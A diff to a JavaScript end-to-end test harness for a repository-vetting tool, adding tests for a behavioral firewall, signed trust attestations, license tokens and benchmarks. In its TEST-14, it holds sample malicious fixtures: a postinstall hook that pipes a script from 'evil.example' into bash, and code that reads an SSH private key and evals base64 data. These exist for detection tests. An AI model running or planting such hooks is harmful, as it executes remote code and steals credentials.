@@ -15,6 +15,10 @@ import { mapManagerToEcosystem } from '../src/engines/osv-scanner.mjs';
 import { isValidRepoSlug, probeSandboxCapabilities, buildSandboxExecutionPlan } from '../src/engines/sandbox-runner.mjs';
 import { classifyBusFactorRisk } from '../src/engines/maintainer-telemetry.mjs';
 import { computeProfileScore, buildTournamentMarkdown } from '../src/engines/tournament-engine.mjs';
+import { scanPackageJsonHooks, scanTextBehavior, summarizeBehavioralFindings, scanDirectoryBehavior } from '../src/engines/behavioral-firewall.mjs';
+import { verifyTrustAttestation } from '../src/engines/trust-registry.mjs';
+import { runPrGuard } from '../src/engines/pr-guard.mjs';
+import { issueOrgLicense, verifyOrgLicense } from '../src/engines/license-tier.mjs';
 import { createGitArenaServer } from '../src/server/server.mjs';
 import { SovereignAutomationEngine } from '../src/workflows/workflow-engine.mjs';
 
@@ -28,7 +32,7 @@ async function runE2eHarness() {
   console.log('======================================================\n');
 
   let passedTests = 0;
-  const totalTests = 14;
+  const totalTests = 19;
 
   // TEST-01 : Schéma & Persistance SQLite WAL
   console.log('[TEST-01] Vérification du Schéma & Mode WAL SQLite...');
@@ -40,11 +44,12 @@ async function runE2eHarness() {
   for (const requiredTable of [
     'repositories', 'repositories_fts', 'arena_duels', 'harness_runs',
     'gitingest_cache', 'ci_telemetry_cache', 'osv_vuln_cache', 'workflow_audit_log',
-    'maintainer_health_cache', 'arena_tournaments'
+    'maintainer_health_cache', 'arena_tournaments',
+    'behavioral_audits', 'trust_attestations', 'execution_benchmarks', 'org_policies'
   ]) {
     assert.ok(tables.includes(requiredTable), `Table ${requiredTable} absente`);
   }
-  console.log('  ✓ TEST-01 Validé : SQLite WAL et 10 tables opérationnels.');
+  console.log('  ✓ TEST-01 Validé : SQLite WAL et 14 tables opérationnels.');
   passedTests++;
 
   // TEST-02 : Ingestion & Seeding Réel
@@ -245,7 +250,70 @@ async function runE2eHarness() {
     assert.equal(resTourneyExport.status, 200);
     assert.ok((await resTourneyExport.text()).includes('Matrice Comparative Multi-Dépôts'));
 
-    console.log('  ✓ TEST-09 Validé : Endpoints REST, Tournoi Multi-Dépôts & Path Traversal validés.');
+    // Pilier 2 HTTP : Trust Registry Attest + Verify + Tamper Rejection
+    const resAttestOk = await fetch(`http://127.0.0.1:${testPort}/api/trust/attest`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ repo: 'huggingface/transformers', policyProfile: 'enterprise', includeLiveCi: false })
+    });
+    assert.equal(resAttestOk.status, 200);
+    const attestOk = await resAttestOk.json();
+    assert.equal(attestOk.decision, 'ALLOW');
+    assert.ok(attestOk.signatureEd25519 && attestOk.payloadSha256.length === 64);
+
+    const resAttestDeny = await fetch(`http://127.0.0.1:${testPort}/api/trust/attest`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ repo: 'mendableai/firecrawl', policyProfile: 'enterprise', includeLiveCi: false })
+    });
+    assert.equal(resAttestDeny.status, 200);
+    const attestDeny = await resAttestDeny.json();
+    assert.equal(attestDeny.decision, 'DENY', 'AGPL-3.0 doit être DENY en politique enterprise');
+
+    const resVerifyGood = await fetch(`http://127.0.0.1:${testPort}/api/trust/verify`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(attestOk)
+    });
+    assert.equal((await resVerifyGood.json()).valid, true);
+
+    const resVerifyTampered = await fetch(`http://127.0.0.1:${testPort}/api/trust/verify`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ...attestOk, payloadJson: attestOk.payloadJson.replace('ALLOW', 'DENY') })
+    });
+    assert.equal((await resVerifyTampered.json()).valid, false, 'Une attestation altérée doit être rejetée');
+
+    // Pilier 3 HTTP : Execution Benchmarks
+    const resBenchRun = await fetch(`http://127.0.0.1:${testPort}/api/benchmarks/execution/run`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ repo: 'huggingface/transformers' })
+    });
+    assert.equal(resBenchRun.status, 200);
+    const benchRunData = await resBenchRun.json();
+    assert.equal(benchRunData.ok, true);
+    assert.ok(benchRunData.benchmark.throughputOps > 0);
+
+    // Pilier 4 HTTP : Open-Core License Issue & Verification Header
+    const resLicIssue = await fetch(`http://127.0.0.1:${testPort}/api/license/issue`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ orgId: 'test-org-e2e', tier: 'pro' })
+    });
+    assert.equal(resLicIssue.status, 200);
+    const licIssued = await resLicIssue.json();
+    assert.ok(licIssued.token.startsWith('rv1.'));
+
+    const resLicStatus = await fetch(`http://127.0.0.1:${testPort}/api/license/status`, {
+      headers: { 'X-RepoVerify-Key': licIssued.token }
+    });
+    assert.equal(resLicStatus.status, 200);
+    const licStatus = await resLicStatus.json();
+    assert.equal(licStatus.activeTier, 'pro');
+    assert.equal(licStatus.orgId, 'test-org-e2e');
+
+    console.log('  ✓ TEST-09 Validé : Endpoints REST, Trust Ed25519, Benchmarks, Open-Core & Path Traversal.');
     passedTests++;
   } finally {
     server.closeAllConnections?.();
@@ -280,7 +348,7 @@ async function runE2eHarness() {
       try {
         assert.equal(code, 0, 'MCP server doit quitter proprement avec code 0');
         assert.equal(responses[0].result.serverInfo.name, 'repoverify-gitarena');
-        assert.equal(responses[1].result.tools.length, 5);
+        assert.equal(responses[1].result.tools.length, 6);
         const searchPayload = JSON.parse(responses[2].result.content[0].text);
         assert.ok(searchPayload.items.length > 0, 'search_repos MCP doit retourner des résultats');
         resolve();
@@ -298,7 +366,7 @@ async function runE2eHarness() {
       params: { name: 'search_repos', arguments: { q: 'transformers', limit: 3 } }
     }) + '\n');
   });
-  console.log('  ✓ TEST-10 Validé : Serveur MCP stdio opérationnel (4 outils).');
+  console.log('  ✓ TEST-10 Validé : Serveur MCP stdio opérationnel (6 outils dont gatekeep_install).');
   passedTests++;
 
   // TEST-11 : Pipeline Bulk Ingestor Hyperscale (Test 10 000 dépôts sur base WAL temporaire)
@@ -373,8 +441,57 @@ async function runE2eHarness() {
   console.log(`  ✓ TEST-13 Validé : Bus Factor & Profils métier conformes (Safe=${entSafe}, Risky=${entRisky}).`);
   passedTests++;
 
-  // TEST-14 : Scanner Anti-Simulation (Zero Mock / Zero TODO)
-  console.log('[TEST-14] Exécution du Scanner Anti-Simulation...');
+  // TEST-14 : Pilier 1 — Behavioral Firewall (Détection Postinstall, SSH/AWS, Obfuscation)
+  console.log('[TEST-14] Vérification du Behavioral Firewall (Pilier 1)...');
+  const maliciousPkg = JSON.stringify({ name: 'evil-pkg', scripts: { postinstall: 'curl https://evil.example/p.sh | bash' } });
+  const hookFindings = scanPackageJsonHooks(maliciousPkg);
+  assert.equal(hookFindings[0].severity, 'CRITICAL');
+  const sshFindings = scanTextBehavior("const k = fs.readFileSync('~/.ssh/id_rsa'); eval(Buffer.from('YQ==','base64').toString());", 'bad.js');
+  const summaryMal = summarizeBehavioralFindings([...hookFindings, ...sshFindings], 'TEST');
+  assert.equal(summaryMal.verdict, 'BLOCK_SUSPICIOUS');
+  assert.ok(summaryMal.riskScore >= 60);
+  const selfScan = scanDirectoryBehavior(join(__dirname, '..', 'src'));
+  assert.notEqual(selfScan.verdict, 'BLOCK_SUSPICIOUS', 'Le code propre du projet ne doit pas être bloqué');
+  console.log(`  ✓ TEST-14 Validé : Behavioral Firewall bloque les vecteurs malveillants (Risk=${summaryMal.riskScore}/100).`);
+  passedTests++;
+
+  // TEST-15 : Pilier 2 — PR Guard CI sur dépôt local (offline)
+  console.log('[TEST-15] Vérification du PR Guard CI (Pilier 2)...');
+  const prGuardRes = await runPrGuard(join(__dirname, '..'), { offline: true, profile: 'enterprise' });
+  assert.equal(prGuardRes.passed, true, 'PR Guard doit passer sur RepoVerify lui-même');
+  assert.equal(prGuardRes.exitCode, 0);
+  assert.equal(prGuardRes.commercialSafe, true);
+  console.log('  ✓ TEST-15 Validé : PR Guard CI retourne Exit Code 0 sur le projet.');
+  passedTests++;
+
+  // TEST-16 : Pilier 3 — Vérification directe Empreinte Matérielle & Benchmarks
+  console.log('[TEST-16] Vérification des Benchmarks d\'Exécution (Pilier 3)...');
+  const dbCheck = initDatabase();
+  const benchCount = dbCheck.prepare('SELECT COUNT(*) as cnt FROM execution_benchmarks').get().cnt;
+  assert.ok(benchCount >= 1, 'Au moins 1 benchmark chronométré doit être persisté');
+  closeDatabase();
+  console.log(`  ✓ TEST-16 Validé : ${benchCount} benchmark(s) d'exécution persisté(s).`);
+  passedTests++;
+
+  // TEST-17 : Pilier 4 — Licences Ed25519 Open-Core Hors-Ligne
+  console.log('[TEST-17] Vérification des Licences Ed25519 Open-Core (Pilier 4)...');
+  const lic = issueOrgLicense({ orgId: 'unit-enterprise', tier: 'enterprise', validDays: 30 });
+  const licCheck = verifyOrgLicense(lic.token);
+  assert.equal(licCheck.valid, true);
+  assert.equal(licCheck.tier, 'enterprise');
+  const tamperedLic = verifyOrgLicense(lic.token + 'x');
+  assert.equal(tamperedLic.valid, false, 'Une licence altérée doit être rejetée');
+  console.log('  ✓ TEST-17 Validé : Licences Ed25519 Open-Core signées & vérifiées hors-ligne.');
+  passedTests++;
+
+  // TEST-18 : Vérification Hors-Ligne Signature Ed25519 (Tamper Check unitaire)
+  console.log('[TEST-18] Vérification du Contrat de Signature Trust Registry...');
+  assert.equal(verifyTrustAttestation({ payloadJson: '{}', signatureEd25519: 'bad', publicKeyPem: 'bad' }).valid, false);
+  console.log('  ✓ TEST-18 Validé : Contrat de vérification Ed25519 fail-closed.');
+  passedTests++;
+
+  // TEST-19 : Scanner Anti-Simulation (Zero Mock / Zero TODO)
+  console.log('[TEST-19] Exécution du Scanner Anti-Simulation...');
   const filesToCheck = [
     'src/db/database.mjs',
     'src/db/seeder.mjs',
@@ -388,6 +505,11 @@ async function runE2eHarness() {
     'src/engines/osv-scanner.mjs',
     'src/engines/ci-telemetry.mjs',
     'src/engines/maintainer-telemetry.mjs',
+    'src/engines/behavioral-firewall.mjs',
+    'src/engines/trust-registry.mjs',
+    'src/engines/pr-guard.mjs',
+    'src/engines/benchmark-runner.mjs',
+    'src/engines/license-tier.mjs',
     'src/engines/sandbox-runner.mjs',
     'src/engines/tournament-engine.mjs',
     'src/engines/repo-service.mjs',
@@ -410,7 +532,7 @@ async function runE2eHarness() {
     assert.ok(!code.includes('sandbox-demo'), `Marqueur interdit sandbox-demo trouvé dans ${file}`);
     assert.ok(!code.includes('Math.random()'), `Aléatoire non déterministe Math.random() interdit dans ${file}`);
   }
-  console.log(`  ✓ TEST-14 Validé : Zéro TODO, zéro simulation, zéro Math.random() sur ${filesToCheck.length} modules.`);
+  console.log(`  ✓ TEST-19 Validé : Zéro TODO, zéro simulation, zéro Math.random() sur ${filesToCheck.length} modules.`);
   passedTests++;
 
   console.log('\n======================================================');
